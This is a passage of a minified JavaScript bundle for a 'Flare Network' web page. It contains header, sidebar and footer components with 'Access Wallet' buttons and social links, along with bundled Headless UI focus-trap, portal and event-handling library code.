    }) => p.jsx("a", {
        href: "#",
        children: p.jsx("img", {
            src: e ? "/logo-white.svg" : "/logo.svg",
            className: "h-8 w-auto"
        })
    }),
    Pm = () => {
        const e = [{
            name: "discord",
            href: "https://discord.com/invite/flarenetwork"
        }, {
            name: "twitter",
            href: "https://twitter.com/FlareNetworks"
        }, {
            name: "telegram",
            href: "https://t.me/FlareNetwork"
        }];
        return p.jsx("footer", {
            className: "bg-gradient-to-r from-primary/20 via-orange-200 to-pink-200 pt-12 text-white",
            children: p.jsxs("section", {
                className: "max-w-screen-xl mx-auto py-12 px-4 flex flex-col md:flex-row gap-4 items-center justify-between",
                children: [p.jsx(Qi, {
                    light: !0
                }), p.jsxs("div", {
                    className: "text-sm",
                    children: ["© ", new Date().getFullYear(), " Flare Network"]
                }), p.jsx("div", {
                    className: "inline-flex flex-wrap gap-4",
                    children: e.map(t => p.jsx("a", {
                        href: t.href,
                        target: "_blank",
                        type: "button",
                        className: " fill-white  h-7 w-7",
                        children: Vi[t.name]
                    }, t.name))
                })]
            })
        })
    },
    jm = ({
        onToggleSidebar: e,
        onConnect: t,
        navLinks: n = []
    }) => p.jsx("header", {
        className: "bg-white text-black w-full sticky h-20 flex items-center right-0 left-0 top-0 z-10",
        children: p.jsxs("nav", {
            className: "w-full max-w-screen-xl mx-auto flex justify-between items-center gap-6 p-4",
            children: [p.jsx(Qi, {}), p.jsx("div", {
                className: "md:inline-flex gap-4 hidden",
                children: n.map(r => p.jsx("a", {
                    className: "hover:underline",
                    href: "#" + r.toLowerCase(),
                    children: r
                }, r))
            }), p.jsx(qe, {
                className: "hidden md:inline-flex",
                variant: "outlined",
                label: "Access Wallet",
                dense: !0,
                onClick: t
            }), p.jsx("button", {
                onClick: e,
                className: "md:hidden text-primary fill-primary h-9 w-9",
                children: Vi.menu
            })]
        })
    }),
    _m = ({
        isOpen: e,
        onToggleSidebar: t,
        onConnect: n,
        navLinks: r = []
    }) => p.jsxs(p.Fragment, {
        children: [e && p.jsx("div", {
            className: "fixed inset-0 bg-black opacity-50 z-5 lg:hidden",
            onClick: t
        }), p.jsx("aside", {
            className: pt(e ? "translate-x-0 animate-slidein" : "translate-x-full", "shadow-md lg:shadow-none lg:border-l", "transition-all duration-200 fixed inset-y-0 right-0 w-full bg-white overflow-y-auto ease-in-out transform z-30 lg:z-[1]"),
            children: p.jsxs("nav", {
                className: "h-full w-full flex flex-col gap-6",
                children: [p.jsxs("div", {
                    className: "px-4 h-20 flex items-center justify-between text-white py-2.5",
                    children: [p.jsx(Qi, {}), p.jsx("button", {
                        className: "h-9 w-9 fill-primary",
                        onClick: t,
                        children: Vi.close
                    })]
                }), p.jsx("ul", {
                    className: "flex-1",
                    children: r.map(l => p.jsx("li", {
                        onClick: t,
                        children: p.jsx("a", {
                            href: "#" + l.toLowerCase(),
                            className: pt("flex items-center gap-2.5 px-4 py-3 cursor-pointer text-xl font-medium"),
                            children: l
                        })
                    }, l))
                }), p.jsx("div", {
                    className: "py-16 px-4",
                    children: p.jsx(qe, {
                        label: "Access Wallets",
                        onClick: n,
                        className: "w-full"
                    })
                })]
            })
        })]
    });
var Lm = Object.defineProperty,
    $m = (e, t, n) => t in e ? Lm(e, t, {
        enumerable: !0,
        configurable: !0,
        writable: !0,
        value: n
    }) : e[t] = n,
    Va = (e, t, n) => ($m(e, typeof t != "symbol" ? t + "" : t, n), n);
let Fm = class {
        constructor() {
            Va(this, "current", this.detect()), Va(this, "handoffState", "pending"), Va(this, "currentId", 0)
        }
        set(t) {
            this.current !== t && (this.handoffState = "pending", this.currentId = 0, this.current = t)
        }
        reset() {
            this.set(this.detect())
        }
        nextId() {
            return ++this.currentId
        }
        get isServer() {
            return this.current === "server"
        }
        get isClient() {
            return this.current === "client"
        }
        detect() {
            return typeof window > "u" || typeof document > "u" ? "server" : "client"
        }
        handoff() {
            this.handoffState === "pending" && (this.handoffState = "complete")
        }
        get isHandoffComplete() {
            return this.handoffState === "complete"
        }
    },
    gt = new Fm,
    ae = (e, t) => {
        gt.isServer ? g.useEffect(e, t) : g.useLayoutEffect(e, t)
    };

function He(e) {
    let t = g.useRef(e);
    return ae(() => {
        t.current = e
    }, [e]), t
}
let z = function(e) {
    let t = He(e);
    return F.useCallback((...n) => t.current(...n), [t])
};

function Vr(e) {
    typeof queueMicrotask == "function" ? queueMicrotask(e) : Promise.resolve().then(e).catch(t => setTimeout(() => {
        throw t
    }))
}

function pn() {
    let e = [],
        t = {
            addEventListener(n, r, l, a) {
                return n.addEventListener(r, l, a), t.add(() => n.removeEventListener(r, l, a))
            },
            requestAnimationFrame(...n) {
                let r = requestAnimationFrame(...n);
                return t.add(() => cancelAnimationFrame(r))
            },
            nextFrame(...n) {
                return t.requestAnimationFrame(() => t.requestAnimationFrame(...n))
            },
            setTimeout(...n) {
                let r = setTimeout(...n);
                return t.add(() => clearTimeout(r))
            },
            microTask(...n) {
                let r = {
                    current: !0
                };
                return Vr(() => {
                    r.current && n[0]()
                }), t.add(() => {
                    r.current = !1
                })
            },
            style(n, r, l) {
                let a = n.style.getPropertyValue(r);
                return Object.assign(n.style, {
                    [r]: l
                }), this.add(() => {
                    Object.assign(n.style, {
                        [r]: a
                    })
                })
            },
            group(n) {
                let r = pn();
                return n(r), this.add(() => r.dispose())
            },
            add(n) {
                return e.push(n), () => {
                    let r = e.indexOf(n);
                    if (r >= 0)
                        for (let l of e.splice(r, 1)) l()
                }
            },
            dispose() {
                for (let n of e.splice(0)) n()
            }
        };
    return t
}

function Ki() {
    let [e] = g.useState(pn);
    return g.useEffect(() => () => e.dispose(), [e]), e
}

function Om() {
    let e = typeof document > "u";
    return "useSyncExternalStore" in xr ? (t => t.useSyncExternalStore)(xr)(() => () => {}, () => !1, () => !e) : !1
}

function Yn() {
    let e = Om(),
        [t, n] = g.useState(gt.isHandoffComplete);
    return t && gt.isHandoffComplete === !1 && n(!1), g.useEffect(() => {
        t !== !0 && n(!0)
    }, [t]), g.useEffect(() => gt.handoff(), []), e ? !1 : t
}
var fu;
let Qt = (fu = F.useId) != null ? fu : function() {
    let e = Yn(),
        [t, n] = F.useState(e ? () => gt.nextId() : null);
    return ae(() => {
        t === null && n(gt.nextId())
    }, [t]), t != null ? "" + t : void 0
};

function Z(e, t, ...n) {
    if (e in t) {
        let l = t[e];
        return typeof l == "function" ? l(...n) : l
    }
    let r = new Error(`Tried to handle "${e}" but there is no handler defined. Only defined handlers are: ${Object.keys(t).map(l=>`"${l}"`).join(", ")}.`);
    throw Error.captureStackTrace && Error.captureStackTrace(r, Z), r
}

function Yi(e) {
    return gt.isServer ? null : e instanceof Node ? e.ownerDocument : e != null && e.hasOwnProperty("current") && e.current instanceof Node ? e.current.ownerDocument : document
}
let Vo = ["[contentEditable=true]", "[tabindex]", "a[href]", "area[href]", "button:not([disabled])", "iframe", "input:not([disabled])", "select:not([disabled])", "textarea:not([disabled])"].map(e => `${e}:not([tabindex='-1'])`).join(",");
var ue = (e => (e[e.First = 1] = "First", e[e.Previous = 2] = "Previous", e[e.Next = 4] = "Next", e[e.Last = 8] = "Last", e[e.WrapAround = 16] = "WrapAround", e[e.NoScroll = 32] = "NoScroll", e))(ue || {}),
    Pn = (e => (e[e.Error = 0] = "Error", e[e.Overflow = 1] = "Overflow", e[e.Success = 2] = "Success", e[e.Underflow = 3] = "Underflow", e))(Pn || {}),
    Rm = (e => (e[e.Previous = -1] = "Previous", e[e.Next = 1] = "Next", e))(Rm || {});

function Mm(e = document.body) {
    return e == null ? [] : Array.from(e.querySelectorAll(Vo)).sort((t, n) => Math.sign((t.tabIndex || Number.MAX_SAFE_INTEGER) - (n.tabIndex || Number.MAX_SAFE_INTEGER)))
}
var $d = (e => (e[e.Strict = 0] = "Strict", e[e.Loose = 1] = "Loose", e))($d || {});

function zm(e, t = 0) {
    var n;
    return e === ((n = Yi(e)) == null ? void 0 : n.body) ? !1 : Z(t, {
        0() {
            return e.matches(Vo)
        },
        1() {
            let r = e;
            for (; r !== null;) {
                if (r.matches(Vo)) return !0;
                r = r.parentElement
            }
            return !1
        }
    })
}
var Dm = (e => (e[e.Keyboard = 0] = "Keyboard", e[e.Mouse = 1] = "Mouse", e))(Dm || {});
typeof window < "u" && typeof document < "u" && (document.addEventListener("keydown", e => {
    e.metaKey || e.altKey || e.ctrlKey || (document.documentElement.dataset.headlessuiFocusVisible = "")
}, !0), document.addEventListener("click", e => {
    e.detail === 1 ? delete document.documentElement.dataset.headlessuiFocusVisible : e.detail === 0 && (document.documentElement.dataset.headlessuiFocusVisible = "")
}, !0));

function ln(e) {
    e == null || e.focus({
        preventScroll: !0
    })
}
let Im = ["textarea", "input"].join(",");

function Am(e) {
    var t, n;
    return (n = (t = e == null ? void 0 : e.matches) == null ? void 0 : t.call(e, Im)) != null ? n : !1
}

function jn(e, t = n => n) {
    return e.slice().sort((n, r) => {
        let l = t(n),
            a = t(r);
        if (l === null || a === null) return 0;
        let o = l.compareDocumentPosition(a);
        return o & Node.DOCUMENT_POSITION_FOLLOWING ? -1 : o & Node.DOCUMENT_POSITION_PRECEDING ? 1 : 0
    })
}

function at(e, t, {
    sorted: n = !0,
    relativeTo: r = null,
    skipElements: l = []
} = {}) {
    let a = Array.isArray(e) ? e.length > 0 ? e[0].ownerDocument : document : e.ownerDocument,
        o = Array.isArray(e) ? n ? jn(e) : e : Mm(e);
    l.length > 0 && o.length > 1 && (o = o.filter(y => !l.includes(y))), r = r ?? a.activeElement;
    let i = (() => {
            if (t & 5) return 1;
            if (t & 10) return -1;
            throw new Error("Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last")
        })(),
        s = (() => {
            if (t & 1) return 0;
            if (t & 2) return Math.max(0, o.indexOf(r)) - 1;
            if (t & 4) return Math.max(0, o.indexOf(r)) + 1;
            if (t & 8) return o.length - 1;
            throw new Error("Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last")
        })(),
        u = t & 32 ? {
            preventScroll: !0
        } : {},
        d = 0,
        h = o.length,
        v;
    do {
        if (d >= h || d + h <= 0) return 0;
        let y = s + d;
        if (t & 16) y = (y + h) % h;
        else {
            if (y < 0) return 3;
            if (y >= h) return 1
        }
        v = o[y], v == null || v.focus(u), d += i
    } while (v !== a.activeElement);
    return t & 6 && Am(v) && v.select(), 2
}

function Fd() {
    return /iPhone/gi.test(window.navigator.platform) || /Mac/gi.test(window.navigator.platform) && window.navigator.maxTouchPoints > 0
}

function Wm() {
    return /Android/gi.test(window.navigator.userAgent)
}

function Um() {
    return Fd() || Wm()
}

function pl(e, t, n) {
    let r = He(t);
    g.useEffect(() => {
        function l(a) {
            r.current(a)
        }
        return document.addEventListener(e, l, n), () => document.removeEventListener(e, l, n)
    }, [e, n])
}

function Od(e, t, n) {
    let r = He(t);
    g.useEffect(() => {
        function l(a) {
            r.current(a)
        }
        return window.addEventListener(e, l, n), () => window.removeEventListener(e, l, n)
    }, [e, n])
}

function Hm(e, t, n = !0) {
    let r = g.useRef(!1);
    g.useEffect(() => {
        requestAnimationFrame(() => {
            r.current = n
        })
    }, [n]);

    function l(o, i) {
        if (!r.current || o.defaultPrevented) return;
        let s = i(o);
        if (s === null || !s.getRootNode().contains(s) || !s.isConnected) return;
        let u = function d(h) {
            return typeof h == "function" ? d(h()) : Array.isArray(h) || h instanceof Set ? h : [h]
        }(e);
        for (let d of u) {
            if (d === null) continue;
            let h = d instanceof HTMLElement ? d : d.current;
            if (h != null && h.contains(s) || o.composed && o.composedPath().includes(h)) return
        }
        return !zm(s, $d.Loose) && s.tabIndex !== -1 && o.preventDefault(), t(o, s)
    }
    let a = g.useRef(null);
    pl("pointerdown", o => {
        var i, s;
        r.current && (a.current = ((s = (i = o.composedPath) == null ? void 0 : i.call(o)) == null ? void 0 : s[0]) || o.target)
    }, !0), pl("mousedown", o => {
        var i, s;
        r.current && (a.current = ((s = (i = o.composedPath) == null ? void 0 : i.call(o)) == null ? void 0 : s[0]) || o.target)
    }, !0), pl("click", o => {
        Um() || a.current && (l(o, () => a.current), a.current = null)
    }, !0), pl("touchend", o => l(o, () => o.target instanceof HTMLElement ? o.target : null), !0), Od("blur", o => l(o, () => window.document.activeElement instanceof HTMLIFrameElement ? window.document.activeElement : null), !0)
}

function Qr(...e) {
    return g.useMemo(() => Yi(...e), [...e])
}

function pu(e) {
    var t;
    if (e.type) return e.type;
    let n = (t = e.as) != null ? t : "button";
    if (typeof n == "string" && n.toLowerCase() === "button") return "button"
}

function Bm(e, t) {
    let [n, r] = g.useState(() => pu(e));
    return ae(() => {
        r(pu(e))
    }, [e.type, e.as]), ae(() => {
        n || t.current && t.current instanceof HTMLButtonElement && !t.current.hasAttribute("type") && r("button")
    }, [n, t]), n
}
let Rd = Symbol();

function Vm(e, t = !0) {
    return Object.assign(e, {
        [Rd]: t
    })
}

function ge(...e) {
    let t = g.useRef(e);
    g.useEffect(() => {
        t.current = e
    }, [e]);
    let n = z(r => {
        for (let l of t.current) l != null && (typeof l == "function" ? l(r) : l.current = r)
    });
    return e.every(r => r == null || (r == null ? void 0 : r[Rd])) ? void 0 : n
}

function Gi(e, t) {
    let n = g.useRef([]),
        r = z(e);
    g.useEffect(() => {
        let l = [...n.current];
        for (let [a, o] of t.entries())
            if (n.current[a] !== o) {
                let i = r(t, l);
                return n.current = t, i
            }
    }, [r, ...t])
}

function Jl(...e) {
    return Array.from(new Set(e.flatMap(t => typeof t == "string" ? t.split(" ") : []))).filter(Boolean).join(" ")
}
var Hn = (e => (e[e.None = 0] = "None", e[e.RenderStrategy = 1] = "RenderStrategy", e[e.Static = 2] = "Static", e))(Hn || {}),
    $t = (e => (e[e.Unmount = 0] = "Unmount", e[e.Hidden = 1] = "Hidden", e))($t || {});

function fe({
    ourProps: e,
    theirProps: t,
    slot: n,
    defaultTag: r,
    features: l,
    visible: a = !0,
    name: o,
    mergeRefs: i
}) {
    i = i ?? Qm;
    let s = Md(t, e);
    if (a) return ml(s, n, r, o, i);
    let u = l ?? 0;
    if (u & 2) {
        let {
            static: d = !1,
            ...h
        } = s;
        if (d) return ml(h, n, r, o, i)
    }
    if (u & 1) {
        let {
            unmount: d = !0,
            ...h
        } = s;
        return Z(d ? 0 : 1, {
            0() {
                return null
            },
            1() {
                return ml({ ...h,
                    hidden: !0,
                    style: {
                        display: "none"
                    }
                }, n, r, o, i)
            }
        })
    }
    return ml(s, n, r, o, i)
}

function ml(e, t = {}, n, r, l) {
    let {
        as: a = n,
        children: o,
        refName: i = "ref",
        ...s
    } = Qa(e, ["unmount", "static"]), u = e.ref !== void 0 ? {
        [i]: e.ref
    } : {}, d = typeof o == "function" ? o(t) : o;
    "className" in s && s.className && typeof s.className == "function" && (s.className = s.className(t));
    let h = {};
    if (t) {
        let v = !1,
            y = [];
        for (let [w, x] of Object.entries(t)) typeof x == "boolean" && (v = !0), x === !0 && y.push(w);
        v && (h["data-headlessui-state"] = y.join(" "))
    }
    if (a === g.Fragment && Object.keys(mu(s)).length > 0) {
        if (!g.isValidElement(d) || Array.isArray(d) && d.length > 1) throw new Error(['Passing props on "Fragment"!', "", `The current component <${r} /> is rendering a "Fragment".`, "However we need to passthrough the following props:", Object.keys(s).map(x => `  - ${x}`).join(`
`), "", "You can apply a few solutions:", ['Add an `as="..."` prop, to ensure that we render an actual element instead of a "Fragment".', "Render a single element as the child so that we can forward the props onto that element."].map(x => `  - ${x}`).join(`
`)].join(`
`));
        let v = d.props,
            y = typeof(v == null ? void 0 : v.className) == "function" ? (...x) => Jl(v == null ? void 0 : v.className(...x), s.className) : Jl(v == null ? void 0 : v.className, s.className),
            w = y ? {
                className: y
            } : {};
        return g.cloneElement(d, Object.assign({}, Md(d.props, mu(Qa(s, ["ref"]))), h, u, {
            ref: l(d.ref, u.ref)
        }, w))
    }
    return g.createElement(a, Object.assign({}, Qa(s, ["ref"]), a !== g.Fragment && u, a !== g.Fragment && h), d)
}

function Qm(...e) {
    return e.every(t => t == null) ? void 0 : t => {
        for (let n of e) n != null && (typeof n == "function" ? n(t) : n.current = t)
    }
}

function Md(...e) {
    if (e.length === 0) return {};
    if (e.length === 1) return e[0];
    let t = {},
        n = {};
    for (let r of e)
        for (let l in r) l.startsWith("on") && typeof r[l] == "function" ? (n[l] != null || (n[l] = []), n[l].push(r[l])) : t[l] = r[l];
    if (t.disabled || t["aria-disabled"]) return Object.assign(t, Object.fromEntries(Object.keys(n).map(r => [r, void 0])));
    for (let r in n) Object.assign(t, {
        [r](l, ...a) {
            let o = n[r];
            for (let i of o) {
                if ((l instanceof Event || (l == null ? void 0 : l.nativeEvent) instanceof Event) && l.defaultPrevented) return;
                i(l, ...a)
            }
        }
    });
    return t
}

function oe(e) {
    var t;
    return Object.assign(g.forwardRef(e), {
        displayName: (t = e.displayName) != null ? t : e.name
    })
}

function mu(e) {
    let t = Object.assign({}, e);
    for (let n in t) t[n] === void 0 && delete t[n];
    return t
}

function Qa(e, t = []) {
    let n = Object.assign({}, e);
    for (let r of t) r in n && delete n[r];
    return n
}
let Km = "div";
var Dr = (e => (e[e.None = 1] = "None", e[e.Focusable = 2] = "Focusable", e[e.Hidden = 4] = "Hidden", e))(Dr || {});

function Ym(e, t) {
    var n;
    let {
        features: r = 1,
        ...l
    } = e, a = {
        ref: t,
        "aria-hidden": (r & 2) === 2 ? !0 : (n = l["aria-hidden"]) != null ? n : void 0,
        style: {
            position: "fixed",
            top: 1,
            left: 1,
            width: 1,
            height: 0,
            padding: 0,
            margin: -1,
            overflow: "hidden",
            clip: "rect(0, 0, 0, 0)",
            whiteSpace: "nowrap",
            borderWidth: "0",
            ...(r & 4) === 4 && (r & 2) !== 2 && {
                display: "none"
            }
        }
    };
    return fe({
        ourProps: a,
        theirProps: l,
        slot: {},
        defaultTag: Km,
        name: "Hidden"
    })
}
let Ir = oe(Ym),
    Xi = g.createContext(null);
Xi.displayName = "OpenClosedContext";
var Le = (e => (e[e.Open = 1] = "Open", e[e.Closed = 2] = "Closed", e[e.Closing = 4] = "Closing", e[e.Opening = 8] = "Opening", e))(Le || {});

function Zi() {
    return g.useContext(Xi)
}

function Gm({
    value: e,
    children: t
}) {
    return F.createElement(Xi.Provider, {
        value: e
    }, t)
}

function Xm(e) {
    function t() {
        document.readyState !== "loading" && (e(), document.removeEventListener("DOMContentLoaded", t))
    }
    typeof window < "u" && typeof document < "u" && (document.addEventListener("DOMContentLoaded", t), t())
}
let jt = [];
Xm(() => {
    function e(t) {
        t.target instanceof HTMLElement && t.target !== document.body && jt[0] !== t.target && (jt.unshift(t.target), jt = jt.filter(n => n != null && n.isConnected), jt.splice(10))
    }
    window.addEventListener("click", e, {
        capture: !0
    }), window.addEventListener("mousedown", e, {
        capture: !0
    }), window.addEventListener("focus", e, {
        capture: !0
    }), document.body.addEventListener("click", e, {
        capture: !0
    }), document.body.addEventListener("mousedown", e, {
        capture: !0
    }), document.body.addEventListener("focus", e, {
        capture: !0
    })
});

function Zm(e) {
    let t = e.parentElement,
        n = null;
    for (; t && !(t instanceof HTMLFieldSetElement);) t instanceof HTMLLegendElement && (n = t), t = t.parentElement;
    let r = (t == null ? void 0 : t.getAttribute("disabled")) === "";
    return r && Jm(n) ? !1 : r
}

function Jm(e) {
    if (!e) return !1;
    let t = e.previousElementSibling;
    for (; t !== null;) {
        if (t instanceof HTMLLegendElement) return !1;
        t = t.previousElementSibling
    }
    return !0
}
var De = (e => (e.Space = " ", e.Enter = "Enter", e.Escape = "Escape", e.Backspace = "Backspace", e.Delete = "Delete", e.ArrowLeft = "ArrowLeft", e.ArrowUp = "ArrowUp", e.ArrowRight = "ArrowRight", e.ArrowDown = "ArrowDown", e.Home = "Home", e.End = "End", e.PageUp = "PageUp", e.PageDown = "PageDown", e.Tab = "Tab", e))(De || {});

function zd(e, t, n, r) {
    let l = He(n);
    g.useEffect(() => {
        e = e ?? window;

        function a(o) {
            l.current(o)
        }
        return e.addEventListener(t, a, r), () => e.removeEventListener(t, a, r)
    }, [e, t, r])
}

function Gn() {
    let e = g.useRef(!1);
    return ae(() => (e.current = !0, () => {
        e.current = !1
    }), []), e
}

function Dd(e) {
    let t = z(e),
        n = g.useRef(!1);
    g.useEffect(() => (n.current = !1, () => {
        n.current = !0, Vr(() => {
            n.current && t()
        })
    }), [t])
}
var cr = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(cr || {});

function qm() {
    let e = g.useRef(0);
    return Od("keydown", t => {
        t.key === "Tab" && (e.current = t.shiftKey ? 1 : 0)
    }, !0), e
}

function Id(e) {
    if (!e) return new Set;
    if (typeof e == "function") return new Set(e());
    let t = new Set;
    for (let n of e.current) n.current instanceof HTMLElement && t.add(n.current);
    return t
}
let e1 = "div";
var Ad = (e => (e[e.None = 1] = "None", e[e.InitialFocus = 2] = "InitialFocus", e[e.TabLock = 4] = "TabLock", e[e.FocusLock = 8] = "FocusLock", e[e.RestoreFocus = 16] = "RestoreFocus", e[e.All = 30] = "All", e))(Ad || {});

function t1(e, t) {
    let n = g.useRef(null),
        r = ge(n, t),
        {
            initialFocus: l,
            containers: a,
            features: o = 30,
            ...i
        } = e;
    Yn() || (o = 1);
    let s = Qr(n);
    l1({
        ownerDocument: s
    }, !!(o & 16));
    let u = a1({
        ownerDocument: s,
        container: n,
        initialFocus: l
    }, !!(o & 2));
    o1({
        ownerDocument: s,
        container: n,
        containers: a,
        previousActiveElement: u
    }, !!(o & 8));
    let d = qm(),
        h = z(x => {
            let S = n.current;
            S && (f => f())(() => {
                Z(d.current, {
                    [cr.Forwards]: () => {
                        at(S, ue.First, {
                            skipElements: [x.relatedTarget]
                        })
                    },
                    [cr.Backwards]: () => {
                        at(S, ue.Last, {
                            skipElements: [x.relatedTarget]
                        })
                    }
                })
            })
        }),
        v = Ki(),
        y = g.useRef(!1),
        w = {
            ref: r,
            onKeyDown(x) {
                x.key == "Tab" && (y.current = !0, v.requestAnimationFrame(() => {
                    y.current = !1
                }))
            },
            onBlur(x) {
                let S = Id(a);
                n.current instanceof HTMLElement && S.add(n.current);
                let f = x.relatedTarget;
                f instanceof HTMLElement && f.dataset.headlessuiFocusGuard !== "true" && (Wd(S, f) || (y.current ? at(n.current, Z(d.current, {
                    [cr.Forwards]: () => ue.Next,
                    [cr.Backwards]: () => ue.Previous
                }) | ue.WrapAround, {
                    relativeTo: x.target
                }) : x.target instanceof HTMLElement && ln(x.target)))
            }
        };
    return F.createElement(F.Fragment, null, !!(o & 4) && F.createElement(Ir, {
        as: "button",
        type: "button",
        "data-headlessui-focus-guard": !0,
        onFocus: h,
        features: Dr.Focusable
    }), fe({
        ourProps: w,
        theirProps: i,
        defaultTag: e1,
        name: "FocusTrap"
    }), !!(o & 4) && F.createElement(Ir, {
        as: "button",
        type: "button",
        "data-headlessui-focus-guard": !0,
        onFocus: h,
        features: Dr.Focusable
    }))
}
let n1 = oe(t1),
    lr = Object.assign(n1, {
        features: Ad
    });

function r1(e = !0) {
    let t = g.useRef(jt.slice());
    return Gi(([n], [r]) => {
        r === !0 && n === !1 && Vr(() => {
            t.current.splice(0)
        }), r === !1 && n === !0 && (t.current = jt.slice())
    }, [e, jt, t]), z(() => {
        var n;
        return (n = t.current.find(r => r != null && r.isConnected)) != null ? n : null
    })
}

function l1({
    ownerDocument: e
}, t) {
    let n = r1(t);
    Gi(() => {
        t || (e == null ? void 0 : e.activeElement) === (e == null ? void 0 : e.body) && ln(n())
    }, [t]), Dd(() => {
        t && ln(n())
    })
}

function a1({
    ownerDocument: e,
    container: t,
    initialFocus: n
}, r) {
    let l = g.useRef(null),
        a = Gn();
    return Gi(() => {
        if (!r) return;
        let o = t.current;
        o && Vr(() => {
            if (!a.current) return;
            let i = e == null ? void 0 : e.activeElement;
            if (n != null && n.current) {
                if ((n == null ? void 0 : n.current) === i) {
                    l.current = i;
                    return
                }
            } else if (o.contains(i)) {
                l.current = i;
                return
            }
            n != null && n.current ? ln(n.current) : at(o, ue.First) === Pn.Error && console.warn("There are no focusable elements inside the <FocusTrap />"), l.current = e == null ? void 0 : e.activeElement
        })
    }, [r]), l
}

function o1({
    ownerDocument: e,
    container: t,
    containers: n,
    previousActiveElement: r
}, l) {
    let a = Gn();
    zd(e == null ? void 0 : e.defaultView, "focus", o => {
        if (!l || !a.current) return;
        let i = Id(n);
        t.current instanceof HTMLElement && i.add(t.current);
        let s = r.current;
        if (!s) return;
        let u = o.target;
        u && u instanceof HTMLElement ? Wd(i, u) ? (r.current = u, ln(u)) : (o.preventDefault(), o.stopPropagation(), ln(s)) : ln(r.current)
    }, !0)
}

function Wd(e, t) {
    for (let n of e)
        if (n.contains(t)) return !0;
    return !1
}
let Ud = g.createContext(!1);

function i1() {
    return g.useContext(Ud)
}

function Qo(e) {
    return F.createElement(Ud.Provider, {
        value: e.force
    }, e.children)
}

function s1(e) {
    let t = i1(),
        n = g.useContext(Hd),
        r = Qr(e),
        [l, a] = g.useState(() => {
            if (!t && n !== null || gt.isServer) return null;
            let o = r == null ? void 0 : r.getElementById("headlessui-portal-root");
            if (o) return o;
            if (r === null) return null;
            let i = r.createElement("div");
            return i.setAttribute("id", "headlessui-portal-root"), r.body.appendChild(i)
        });
    return g.useEffect(() => {
        l !== null && (r != null && r.body.contains(l) || r == null || r.body.appendChild(l))
    }, [l, r]), g.useEffect(() => {
        t || n !== null && a(n.current)
    }, [n, a, t]), l
}
let u1 = g.Fragment;

function c1(e, t) {
    let n = e,
        r = g.useRef(null),
        l = ge(Vm(d => {
            r.current = d
        }), t),
        a = Qr(r),
        o = s1(r),
        [i] = g.useState(() => {
            var d;
            return gt.isServer ? null : (d = a == null ? void 0 : a.createElement("div")) != null ? d : null
        }),
        s = g.useContext(Ko),
        u = Yn();
    return ae(() => {
        !o || !i || o.contains(i) || (i.setAttribute("data-headlessui-portal", ""), o.appendChild(i))
    }, [o, i]), ae(() => {
        if (i && s) return s.register(i)
    }, [s, i]), Dd(() => {
        var d;
        !o || !i || (i instanceof Node && o.contains(i) && o.removeChild(i), o.childNodes.length <= 0 && ((d = o.parentElement) == null || d.removeChild(o)))
    }), u ? !o || !i ? null : _d.createPortal(fe({
        ourProps: {
            ref: l
        },
        theirProps: n,
        defaultTag: u1,
        name: "Portal"
    }), i) : null
}
let d1 = g.Fragment,
    Hd = g.createContext(null);

function f1(e, t) {
    let {
        target: n,
        ...r
    } = e, l = {
        ref: ge(t)
    };
    return F.createElement(Hd.Provider, {
        value: n
    }, fe({
        ourProps: l,
        theirProps: r,
        defaultTag: d1,
        name: "Popover.Group"
    }))
}
let Ko = g.createContext(null);

function p1() {
    let e = g.useContext(Ko),
        t = g.useRef([]),
        n = z(a => (t.current.push(a), e && e.register(a), () => r(a))),
        r = z(a => {
            let o = t.current.indexOf(a);
            o !== -1 && t.current.splice(o, 1), e && e.unregister(a)
        }),
        l = g.useMemo(() => ({
            register: n,
            unregister: r,
            portals: t
        }), [n, r, t]);
    return [t, g.useMemo(() => function({
        children: a
    }) {
        return F.createElement(Ko.Provider, {
            value: l
        }, a)
    }, [l])]
}
let m1 = oe(c1),
    h1 = oe(f1),
    Yo = Object.assign(m1, {
        Group: h1
    });

function v1(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
const g1 = typeof Object.is == "function" ? Object.is : v1,
    {
        useState: y1,
        useEffect: w1,
        useLayoutEffect: x1,
        useDebugValue: k1
    } = xr;

function b1(e, t, n) {
    const r = t(),
        [{
            inst: l
        }, a] = y1({
            inst: {
                value: r,
                getSnapshot: t
            }
        });
    return x1(() => {
        l.value = r, l.getSnapshot = t, Ka(l) && a({
            inst: l
        })
    }, [e, r, t]), w1(() => (Ka(l) && a({
        inst: l
    }), e(() => {
        Ka(l) && a({
            inst: l
        })
    })), [e]), k1(r), r
}

function Ka(e) {
    const t = e.getSnapshot,
        n = e.value;
    try {
        const r = t();
        return !g1(n, r)
    } catch {
        return !0
    }
}

function S1(e, t, n) {
    return t()
}
const E1 = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u",
    N1 = !E1,
    C1 = N1 ? S1 : b1,
    T1 = "useSyncExternalStore" in xr ? (e => e.useSyncExternalStore)(xr) : C1;

function P1(e) {
    return T1(e.subscribe, e.getSnapshot, e.getSnapshot)
}

function j1(e, t) {
    let n = e(),
        r = new Set;
    return {
        getSnapshot() {
            return n
        },
        subscribe(l) {
            return r.add(l), () => r.delete(l)
        },
        dispatch(l, ...a) {
            let o = t[l].call(n, ...a);
            o && (n = o, r.forEach(i => i()))
        }
    }
}

function _1() {
    let e;
    return {
        before({
            doc: t
        }) {
            var n;
            let r = t.documentElement;
            e = ((n = t.defaultView) != null ? n : window).innerWidth - r.clientWidth
        },
        after({
            doc: t,
            d: n
        }) {
            let r = t.documentElement,
                l = r.clientWidth - r.offsetWidth,
                a = e - l;
            n.style(r, "paddingRight", `${a}px`)
        }
    }
}

function L1() {
    return Fd() ? {
        before({
            doc: e,
            d: t,
            meta: n
        }) {
            function r(l) {
                return n.containers.flatMap(a => a()).some(a => a.contains(l))
            }
            t.microTask(() => {
                var l;
                if (window.getComputedStyle(e.documentElement).scrollBehavior !== "auto") {
                    let i = pn();
                    i.style(e.documentElement, "scrollBehavior", "auto"), t.add(() => t.microTask(() => i.dispose()))
                }
                let a = (l = window.scrollY) != null ? l : window.pageYOffset,
                    o = null;
                t.addEventListener(e, "click", i => {
                    if (i.target instanceof HTMLElement) try {
                        let s = i.target.closest("a");
                        if (!s) return;
                        let {
                            hash: u
                        } = new URL(s.href), d = e.querySelector(u);
                        d && !r(d) && (o = d)
                    } catch {}
                }, !0), t.addEventListener(e, "touchstart", i => {
                    if (i.target instanceof HTMLElement)
                        if (r(i.target)) {
                            let s = i.target;
